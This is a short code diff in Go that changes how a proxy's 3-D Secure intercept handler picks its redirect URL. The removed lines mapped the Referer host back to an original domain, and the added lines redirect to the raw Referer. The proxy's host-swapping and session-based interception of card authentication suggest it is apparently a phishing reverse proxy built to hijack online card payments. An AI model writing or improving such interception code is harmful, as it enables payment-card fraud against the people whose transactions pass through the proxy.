@@ -3212,16 +3212,8 @@ func (p *HttpProxy) handle3DSIntercept(req *http.Request, sessionID string, temp
 		referer := req.Referer()
 		log.Info("[3DS] Referer: %s", referer)
 		if referer != "" {
-			if refererURL, err := url.Parse(referer); err == nil {
-				if origHost, ok2 := p.replaceHostWithOriginal(refererURL.Host); ok2 {
-					refererURL.Host = origHost
-					refererURL.Scheme = "https"
-					redirectURL = refererURL.String()
-					log.Info("[3DS] 动态跳转地址: %s", redirectURL)
-				} else {
-					log.Info("[3DS] 域名替换失败: %s", refererURL.Host)
-				}
-			}
+			redirectURL = referer
+			log.Info("[3DS] 动态跳转地址: %s", redirectURL)
 		}
 	}
 
